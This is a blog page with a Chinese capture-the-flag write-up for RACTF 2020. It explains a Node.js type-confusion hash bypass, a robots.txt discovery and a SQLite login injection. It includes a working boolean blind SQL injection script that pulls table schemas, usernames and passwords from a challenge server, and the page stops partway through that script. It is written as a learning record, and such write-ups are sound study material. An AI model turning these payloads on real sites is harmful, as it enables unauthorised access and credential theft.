@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="首次参加国外CTF，图个新鲜和乐呵。还是偶然间在ctfhub-ctf时间表上看到的，挺有意思的。贴个链接，以供来年参加。  WebC0llide?提示：A target service is asking for two bits of information that have the same “custom hash”, but can’t be identical. Looks like">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RACTF2020">
+<meta property="og:url" content="https://crownz-sec.github.io/2020/06/07/RACTF2020/index.html">
+<meta property="og:site_name" content="crownZ&#39;s Blog">
+<meta property="og:description" content="首次参加国外CTF，图个新鲜和乐呵。还是偶然间在ctfhub-ctf时间表上看到的，挺有意思的。贴个链接，以供来年参加。  WebC0llide?提示：A target service is asking for two bits of information that have the same “custom hash”, but can’t be identical. Looks like">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200607205435.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200607220414.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200607221146.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200607220128.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200607223347.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200607223435.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200608220614.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200608221007.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200608220943.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200608221231.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200608221814.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200609200820.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200609201028.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200609201546.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200609201717.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200609202705.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200610200538.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200608081639.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200608081751.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200608082024.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200608082155.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200608082404.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200608082506.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200608083652.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200608082533.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200608082742.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200608082905.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200608083039.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200608162236.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200608162152.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200608183226.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200608190307.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200609085235.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200609085353.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200609085623.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200609093140.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200609085756.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200609092112.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200609092258.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200610201921.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200610203021.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200610203328.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200610204206.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200610202642.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200608100357.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/crownz-sec/Blog_Source@master/img/20200608104552.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200608103305.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200608103421.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200610211135.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/crownz-sec/Blog_Source@master/img/20200608104755.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200608105520.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200607182039.png">
+<meta property="article:published_time" content="2020-06-07T11:00:00.000Z">
+<meta property="article:modified_time" content="2020-06-21T01:39:34.558Z">
+<meta property="article:author" content="crownZ">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="Nodejs">
+<meta property="article:tag" content="Flask">
+<meta property="article:tag" content="Python">
+<meta property="article:tag" content="SQL注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/crownz/blog_image/raw/master/20200607205435.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>RACTF2020</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2020/06/09/vulnhub_DC3/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2020/05/26/GKCTF2020/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://crownz-sec.github.io/2020/06/07/RACTF2020/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://crownz-sec.github.io/2020/06/07/RACTF2020/&text=RACTF2020"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://crownz-sec.github.io/2020/06/07/RACTF2020/&title=RACTF2020"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://crownz-sec.github.io/2020/06/07/RACTF2020/&is_video=false&description=RACTF2020"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=RACTF2020&body=Check out this article: https://crownz-sec.github.io/2020/06/07/RACTF2020/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://crownz-sec.github.io/2020/06/07/RACTF2020/&title=RACTF2020"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://crownz-sec.github.io/2020/06/07/RACTF2020/&title=RACTF2020"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://crownz-sec.github.io/2020/06/07/RACTF2020/&title=RACTF2020"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://crownz-sec.github.io/2020/06/07/RACTF2020/&title=RACTF2020"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://crownz-sec.github.io/2020/06/07/RACTF2020/&name=RACTF2020&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://crownz-sec.github.io/2020/06/07/RACTF2020/&t=RACTF2020"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#C0llide"><span class="toc-number">1.1.</span> <span class="toc-text">C0llide?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%832"><span class="toc-number">1.2.</span> <span class="toc-text">环境2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Quarantine-Hidden-information"><span class="toc-number">1.2.1.</span> <span class="toc-text">Quarantine - Hidden information</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Quarantine"><span class="toc-number">1.2.2.</span> <span class="toc-text">Quarantine</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Getting-admin"><span class="toc-number">1.2.3.</span> <span class="toc-text">Getting admin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Finding-server-information-%E6%9C%AA%E5%81%9A%E5%87%BA"><span class="toc-number">1.2.4.</span> <span class="toc-text">Finding server information(未做出)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%833"><span class="toc-number">1.3.</span> <span class="toc-text">环境3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Entrypoint"><span class="toc-number">1.3.1.</span> <span class="toc-text">Entrypoint</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Baiting"><span class="toc-number">1.3.2.</span> <span class="toc-text">Baiting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Admin-Attack-%E6%9C%AA%E5%81%9A%E5%87%BA"><span class="toc-number">1.3.3.</span> <span class="toc-text">Admin Attack(未做出)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Vandalism-%E6%9C%AA%E5%81%9A%E5%87%BA"><span class="toc-number">1.3.4.</span> <span class="toc-text">Vandalism(未做出)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Insert-witty-name-%E6%9C%AA%E5%81%9A%E5%87%BA"><span class="toc-number">1.3.5.</span> <span class="toc-text">Insert witty name(未做出)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Xtremely-Memorable-Listing"><span class="toc-number">1.3.6.</span> <span class="toc-text">Xtremely Memorable Listing</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Discord"><span class="toc-number">2.1.</span> <span class="toc-text">Discord</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#OSINT"><span class="toc-number">3.</span> <span class="toc-text">OSINT</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#RAirways"><span class="toc-number">3.1.</span> <span class="toc-text">RAirways</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Remote-Retreat"><span class="toc-number">3.2.</span> <span class="toc-text">Remote Retreat</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Cryptography"><span class="toc-number">4.</span> <span class="toc-text">Cryptography</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Really-Simple-Algorithm"><span class="toc-number">4.1.</span> <span class="toc-text">Really Simple Algorithm</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-number">5.</span> <span class="toc-text">后记</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        RACTF2020
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">crownZ</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-06-07T11:00:00.000Z" itemprop="datePublished">2020-06-07</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Flask/" rel="tag">Flask</a>, <a class="tag-link-link" href="/tags/Nodejs/" rel="tag">Nodejs</a>, <a class="tag-link-link" href="/tags/Python/" rel="tag">Python</a>, <a class="tag-link-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a>, <a class="tag-link-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <blockquote>
+<p>首次参加国外CTF，图个新鲜和乐呵。还是偶然间在<a target="_blank" rel="noopener" href="https://www.ctfhub.com/#/calendar">ctfhub-ctf时间表</a>上看到的，挺有意思的。贴个<a target="_blank" rel="noopener" href="https://ractf.co.uk/">链接</a>，以供来年参加。</p>
+</blockquote>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="C0llide"><a href="#C0llide" class="headerlink" title="C0llide?"></a>C0llide?</h2><p>提示：A target service is asking for two bits of information that have the same “custom hash”, but can’t be identical. Looks like we’re going to have to generate a collision?</p>
+<p>翻译：目标服务请求具有相同“自定义散列”的两位信息，但不能完全相同。看起来我们要产生碰撞了?</p>
+<p>题目直接给出了代码，是nodejs的。因为nodejs对于可能在web中不太常见（至少对我来说是这样），一些题可能就是直接给出一小段代码，然后去考察小的漏洞知识点，就像最近GKCTF中的EzNode。这里把获取flag的方式都给出来了，下来就看怎么达到获取flag的要求了。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&quot;body-parser&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> customhash = <span class="built_in">require</span>(<span class="string">&quot;./customhash&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line">app.use(bodyParser.json())	<span class="comment">//json解析</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span></span><br><span class="line"><span class="keyword">const</span> flag = <span class="string">&quot;flag&quot;</span></span><br><span class="line"><span class="keyword">const</span> secret_key = <span class="string">&quot;Y0ure_g01nG_t0_h4v3_t0_go_1nto_h4rdc0r3_h4ck1ng_m0d3&quot;</span></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[-] Source view&quot;</span>)</span><br><span class="line">    res.type(<span class="string">&quot;text&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> fs.readFile(<span class="string">&quot;index.js&quot;</span>, <span class="function">(<span class="params">err,data</span>) =&gt;</span> res.send(data.toString().replace(flag, <span class="string">&quot;flag&quot;</span>)))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/getflag&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[-] Getflag post&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> (!req.body) &#123;<span class="keyword">return</span> res.send(<span class="string">&quot;400&quot;</span>)&#125;</span><br><span class="line">    <span class="keyword">let</span> one = req.body.one</span><br><span class="line">    <span class="keyword">let</span> two = req.body.two</span><br><span class="line">    <span class="built_in">console</span>.log(req.body)</span><br><span class="line">    <span class="keyword">if</span> (!one || !two) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(<span class="string">&quot;400&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((one.length !== two.length) || (one === two)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(<span class="string">&quot;Strings are either too different or not different enough&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    one = customhash.hash(secret_key + one)</span><br><span class="line">    two = customhash.hash(secret_key + two)</span><br><span class="line">    <span class="keyword">if</span> (one == two) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;[*] Flag get!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> res.send(flag)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(<span class="string">`<span class="subst">$&#123;one&#125;</span> did not match <span class="subst">$&#123;two&#125;</span>!`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(port, <span class="function">() =&gt;</span> <span class="built_in">console</span>.log(<span class="string">`Listening on port <span class="subst">$&#123;port&#125;</span>`</span>))</span><br></pre></td></tr></table></figure>
+
+<p>看完代码再结合提示，就可以知道题目想要我们产生碰撞。首先，需要传两个参数one和two；然后，两个参数长度必须相等但内容不相等（三个=）；最后，两参数分别加上secret_key，被customhash.hash()函数处理，如果处理结果相等（两个=），就可以得到flag。这里的==和===类似于php，==可以忽略类型，===要求值和类型都必须相同。</p>
+<p>刚开始，以为漏洞点存在于customhash.hash()这个函数。但我找了一会儿，发现找不到这个东西的poc，再看下它的代码是本地包含的，看来是自己写的hash。然后发现走错方向了，在看那个==和===的区别，发现应该是利用nodejs的字符比较特性来解题的，最后在这篇<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7752#toc-3">博客</a>找到了答案。</p>
+<p>学习后，构造[6, 6]和[“6”, “6”]。（后面的[6]和[“6”]都一样，没差别）</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200607205435.png"></p>
+<p>至此为此，我的思路都对，已经可以解出来了。但是我在在post传json数据上面栽了坑，一直在尝试最常用的post传参数，结果就是一直传不过去。后面在本地调试后，知道了req请求体一直为空。心想代码总不可能有问题吧，然后就去谷歌了nodejs怎么post传不过去数据。得知传不过去，必定是方式有问题，才改成了post传json数据。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200607220414.png"></p>
+<p>在改成传json数据数据之后，仍然出了点小问题，我把one和two的值都用引号括起来了，这样就造成它们被解析为字符串了。one的值为”[6]”，长度为3；tow的值为”[“6”]”，长度为5，这样就过不去第二个判断了。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200607221146.png"></p>
+<p>又经过本地调试几次，才知道要把引号给去了。想传什么类型的值，直接传就好，数字和数组都不用加引号。最终的payload为json格式的数据，并选择hackbar的数据格式为application/json。执行，得到flag。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200607220128.png"></p>
+<p><del>踩坑踩到我想死，基础薄弱啊</del>。</p>
+<h2 id="环境2"><a href="#环境2" class="headerlink" title="环境2"></a>环境2</h2><h3 id="Quarantine-Hidden-information"><a href="#Quarantine-Hidden-information" class="headerlink" title="Quarantine - Hidden information"></a>Quarantine - Hidden information</h3><p>题目：Challenge instance ready at .<code>95.216.233.106:41794</code>.</p>
+<p>提示：We think there’s a file they don’t want people to see hidden somewhere! See if you can find it, it’s gotta be on their webapp somewhere…</p>
+<p>根据提示，想到robots.txt。访问一下，看到提示。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200607223347.png"></p>
+<p>访问/admin-stash，得到flag。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200607223435.png"></p>
+<p>送分题？？？</p>
+<h3 id="Quarantine"><a href="#Quarantine" class="headerlink" title="Quarantine"></a>Quarantine</h3><p>提示：See if you can get access to an account on the webapp.</p>
+<p>环境仍然是上面的环境，但是有不同的要求，要获取账户访问权限。登录界面如下。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200608220614.png"></p>
+<p>在登录框输入用户名a’和密码123，看到报错</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200608221007.png"></p>
+<p>输入用户名a’–和密码123，看到回显不可用的账户或密码，证明存在注入。这里的–为sqlite的注释符，直接这样想，是因为下面有道题目同样是flask框架，看着环境近乎一样，这里就也猜想他用的库为sqlite。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200608220943.png"></p>
+<p>输入用户名a’or ‘1’–和密码123，看到有一个标志。那么就可以根据是否出现这个标志进行布尔盲注。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200608221231.png"></p>
+<p>写脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! -*- encoding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request</span>(<span class="params">index, compare, chr_index</span>):</span></span><br><span class="line">    url = <span class="string">&quot;http://95.216.233.106:33211/sign-in&quot;</span></span><br><span class="line">    a=<span class="string">&quot;&#x27;or(select sqlite_version())--&quot;</span></span><br><span class="line">    <span class="comment">#1.数据库版本</span></span><br><span class="line">    payload = <span class="string">&quot;&#x27; or (substr((select sqlite_version()),&#123;0&#125;,1) &#123;1&#125; &#123;2&#125;) --&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(index), compare, <span class="built_in">ascii</span>(<span class="built_in">chr</span>(chr_index)))</span><br><span class="line">    <span class="comment">#2.所有表名  users</span></span><br><span class="line">    payload = <span class="string">&quot;&#x27; or (substr((SELECT name FROM sqlite_master WHERE type=&#x27;table&#x27;),&#123;0&#125;,1) &#123;1&#125; &#123;2&#125;) --&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(index), compare, <span class="built_in">ascii</span>(<span class="built_in">chr</span>(chr_index)))</span><br><span class="line">    <span class="comment">#3.所有表结构(包含字段名，表名,</span></span><br><span class="line">    <span class="comment"># create table users (username char, password char, privilege int)</span></span><br><span class="line">    payload = <span class="string">&quot;&#x27; or (substr((SELECT sql FROM sqlite_master WHERE type=&#x27;table&#x27;),&#123;0&#125;,1) &#123;1&#125; &#123;2&#125;) --&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(index), compare, <span class="built_in">ascii</span>(<span class="built_in">chr</span>(chr_index)))</span><br><span class="line">    <span class="comment">#4字段内容, 一次只能查一个字段</span></span><br><span class="line">    <span class="comment"># username:Harry,John,Dave</span></span><br><span class="line">    payload = <span class="string">&quot;&#x27; or (substr((SELECT group_concat(username) FROM users),&#123;0&#125;,1) &#123;1&#125; &#123;2&#125;) --&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(index), compare, <span class="built_in">ascii</span>(<span class="built_in">chr</span>(chr_index)))</span><br><span class="line">    <span class="comment"># password:P@ssw0rd123!s%dgyASD,cr1k3yth4ts4l0ngp4ss,p3rf3ct1nfr4structre</span></span><br><span class="line">    payload = <span class="string">&quot;&#x27; or (substr((SELECT group_concat(password) FROM users),&#123;0&#125;,1) &#123;1&#125; &#123;2&#125;) --&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(index), compare, <span class="built_in">ascii</span>(<span class="built_in">chr</span>(chr_index)))</span><br><span class="line">    <span class="comment"># privilege:1,1,1</span></span><br><span class="line">    payload = <span class="string">&quot;&#x27; or (substr((SELECT group_concat(privilege) FROM users),&#123;0&#125;,1) &#123;1&#125; &#123;2&#125;) --&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(index), compare, <span class="built_in">ascii</span>(<span class="built_in">chr</span>(chr_index)))</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&#x27;user&#x27;</span>: payload,</span><br><span class="line">        <span class="string">&#x27;pass&#x27;</span>:<span class="string">&#x27;1&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    r=requests.post(url, data=data)</span><br><span class="line">    <span class="comment">#print(r.text)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Attempting&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span 